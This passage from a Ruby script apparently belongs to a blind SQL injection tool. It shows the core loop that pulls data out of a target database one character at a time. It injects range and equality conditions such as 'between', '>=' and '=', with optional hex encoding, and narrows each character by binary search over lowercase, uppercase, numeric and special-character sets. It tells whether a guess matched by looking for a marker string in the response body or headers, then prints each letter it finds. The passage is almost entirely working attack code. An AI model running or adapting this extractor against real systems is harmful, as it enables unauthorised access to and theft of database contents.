									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr16
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					end
				end
			end
		end

		# numeric
		if found == 0
			if $hex == "y"
				configreq(" between" + " 0x" + "0".unpack('H*')[0] + " and " + "0x" + "9".unpack('H*')[0])
			else
				configreq("between" + $oh + "0" + $oh + "and" + $oh + "9")
			end
			sendreq()
			send2ndreq() if $secfile != ""
			$fheader = "n"
			$response.to_hash.each { |k,v|
				$fheader = "y" if k.to_s.include?($search)
				$fheader = "y" if v.to_s.include?($search)
			}
			if $response.body.include?($search) || $fheader == "y"
				if $hex == "y"
					configreq(" between" + " 0x" + "0".unpack('H*')[0] + " and " + "0x" + "4".unpack('H*')[0])
				else
					configreq("between" + $oh + "0" + $oh + "and" + $oh + "4")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					for ch in $arrn1
						if $hex == "y"
							configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
						else
							configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							$result = $result + ch
	    	      			              	puts "Letter " + $i.to_s + " found: " + ch
							found = 1
			   	                    	break
						end
					end
				else
					for ch in $arrn2
						if $hex == "y"
							configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
						else
							configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							$result = $result + ch
		      			              	puts "Letter " + $i.to_s + " found: " + ch
							found = 1
			   	                    	break
						end
					end
				end
			end
		end

		# special character
		if found == 0
			for ch in $arrs
				if $hex == "y"
					configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
				else
					configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					$result = $result + ch
			      	       	puts "Letter " + $i.to_s + " found: " + ch
					found = 1
			               	break
				end
			end
		end

	elsif $mode == "a"

		# lowercase
		if $hex == "y"
			configreq(">=" + " 0x" + "a".unpack('H*')[0])
		else
			configreq(">=" + $oh + "a")
		end
		sendreq()
		send2ndreq() if $secfile != ""
		$fheader = "n"
		$response.to_hash.each { |k,v|
			$fheader = "y" if k.to_s.include?($search)
			$fheader = "y" if v.to_s.include?($search)
		}
		if $response.body.include?($search) || $fheader == "y"
			if $hex == "y"
				configreq("<=" + " 0x" + "m".unpack('H*')[0])
			else
				configreq("<=" + $oh + "m")
			end
			sendreq()
			send2ndreq() if $secfile != ""
			$fheader = "n"
			$response.to_hash.each { |k,v|
				$fheader = "y" if k.to_s.include?($search)
				$fheader = "y" if v.to_s.include?($search)
			}
			if $response.body.include?($search) || $fheader == "y"
				if $hex == "y"
					configreq("<=" + " 0x" + "f".unpack('H*')[0])
				else
					configreq("<=" + $oh + "f")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					if $hex == "y"
						configreq("<=" + " 0x" + "c".unpack('H*')[0])
					else
						configreq("<=" + $oh + "c")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr1
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr2
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				else
					if $hex == "y"
						configreq("<=" + " 0x" + "i".unpack('H*')[0])
					else
						configreq("<=" + $oh + "i")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr3
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr4
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				end
			else
				if $hex == "y"
					configreq("<=" + " 0x" + "s".unpack('H*')[0])
				else
					configreq("<=" + $oh + "s")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					if $hex == "y"
						configreq("<=" + " 0x" + "p".unpack('H*')[0])
					else
						configreq("<=" + $oh + "p")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr5
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr6
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				else
					if $hex == "y"
						configreq("<=" + " 0x" + "v".unpack('H*')[0])
					else
						configreq("<=" + $oh + "v")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr7
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr8
							if $hex == "y"
								configreq("=" + "0x" + ch.unpack('H*')[0])
							else
								configreq("=" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				end
			end
		end

		# uppercase - only when case-sensitive specified
		if $case == "y" && found == 0
			if $hex == "y"
				configreq(">=" + " 0x" + "A".unpack('H*')[0])
			else
				configreq(">=" + $oh + "A")
			end
			sendreq()
			send2ndreq() if $secfile != ""
			$fheader = "n"
			$response.to_hash.each { |k,v|
				$fheader = "y" if k.to_s.include?($search)
				$fheader = "y" if v.to_s.include?($search)
			}
			if $response.body.include?($search) || $fheader == "y"
				if $hex == "y"
					configreq("<=" + " 0x" + "M".unpack('H*')[0])
				else
					configreq("<=" + $oh + "M")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					if $hex == "y"
						configreq("<=" + " 0x" + "F".unpack('H*')[0])
					else
						configreq("<=" + $oh + "F")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						if $hex == "y"
							configreq("<=" + " 0x" + "C".unpack('H*')[0])
						else
							configreq("<=" + $oh + "C")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr9
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr10
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					else
						if $hex == "y"
							configreq("<=" + " 0x" + "I".unpack('H*')[0])
						else
							configreq("<=" + $oh + "I")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr11
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr12
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					end
				else
					if $hex == "y"
						configreq("<=" + " 0x" + "S".unpack('H*')[0])
					else
						configreq("<=" + $oh + "S")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						if $hex == "y"
							configreq("<=" + " 0x" + "P".unpack('H*')[0])
						else
							configreq("<=" + $oh + "P")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr13
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr14
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					else
						if $hex == "y"
							configreq("<=" + " 0x" + "V".unpack('H*')[0])
						else
							configreq("<=" + $oh + "V")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr15
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr16
								if $hex == "y"
									configreq("=" + "0x" + ch.unpack('H*')[0])
								else
									configreq("=" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					end
				end
			end
		end

		# numeric
		if found == 0
			if $hex == "y"
				configreq(">=" + " 0x" + "0".unpack('H*')[0])
			else
				configreq(">=" + $oh + "0")
			end
			sendreq()
			send2ndreq() if $secfile != ""
			$fheader = "n"
			$response.to_hash.each { |k,v|
				$fheader = "y" if k.to_s.include?($search)
				$fheader = "y" if v.to_s.include?($search)
			}
			if $response.body.include?($search) || $fheader == "y"
				if $hex == "y"
					configreq("<=" + " 0x" + "4".unpack('H*')[0])
				else
					configreq("<=" + $oh + "4")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					for ch in $arrn1
						if $hex == "y"
							configreq("=" + "0x" + ch.unpack('H*')[0])
						else
							configreq("=" + $oh + ch)
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							$result = $result + ch
	    	      			              	puts "Letter " + $i.to_s + " found: " + ch
							found = 1
			   	                    	break
						end
					end
				else
					for ch in $arrn2
						if $hex == "y"
							configreq("=" + "0x" + ch.unpack('H*')[0])
						else
							configreq("=" + $oh + ch)
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							$result = $result + ch
		      			              	puts "Letter " + $i.to_s + " found: " + ch
							found = 1
			   	                    	break
						end
					end
				end
			end
		end

		# special character
		if found == 0
			for ch in $arrs
				if $hex == "y"
					configreq("=" + "0x" + ch.unpack('H*')[0])
				else
					configreq("=" + $oh + ch)
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					$result = $result + ch
			      	       	puts "Letter " + $i.to_s + " found: " + ch
					found = 1
			               	break
				end
			end
		end
	end

	# printing results
	if found == 0
		if $result == ""
        		puts "No results. Probably wrong pattern."
	            	break
	        else 
			puts "\nFull result:\n" + $result
			break
	        end
        end
end

# means that there are still chars to enumerate
if found == 1
	puts "\nRetreving not finished:\n" + $result
end

